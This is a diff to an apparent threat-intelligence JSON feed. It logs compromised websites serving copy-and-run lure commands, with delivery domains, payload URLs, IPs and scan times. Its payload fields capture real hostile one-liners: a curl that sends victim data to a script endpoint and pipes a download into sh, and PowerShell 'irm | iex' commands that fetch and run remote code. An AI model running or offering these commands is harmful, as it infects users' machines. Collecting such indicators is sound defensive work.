@@ -1,5 +1,90 @@
 [
   {
+    "UrlDomain": "royalalco.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "46.202.158.207"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=f7a2f308-654a-42ed-ad88-2f93bc30117e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Froyalalco[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T22%3A59%3A55.751Z&lastShellAt=2026-11-18T22%3A59%3A55.751Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwmq6mn81u2e0omlnph8wtas",
+    "ScannedAt": "2026-11-18T23:01:19.849000+00:00"
+  },
+  {
+    "UrlDomain": "aroveafpl.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.133"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/e42bbacd936c1293",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/e42bbacd936c1293'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/e42bbacd936c1293"
+    ],
+    "ReportId": "cmwmps60l1tve0oml0q574odl",
+    "ScannedAt": "2026-11-18T22:50:05.086000+00:00"
+  },
+  {
+    "UrlDomain": "www.fieragustarte.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/9beed38f887f936f"
+    ],
+    "IP": [
+      "89.46.105.97"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9beed38f887f936f')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/9beed38f887f936f"
+    ],
+    "ReportId": "cmwmprc2s1tt50oml5ze1kcq5",
+    "ScannedAt": "2026-11-18T22:49:26.262000+00:00"
+  },
+  {
+    "UrlDomain": "assurena.fr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2c3ea9f666a8162f"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2c3ea9f666a8162f')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2c3ea9f666a8162f"
+    ],
+    "ReportId": "cmwmpr8en1tsv0omlk0d2kreg",
+    "ScannedAt": "2026-11-18T22:49:21.502000+00:00"
+  },
+  {
     "UrlDomain": "chatatrebichava.sk",
     "DeliveryUrl": [
       "j7tracker.gb.net"
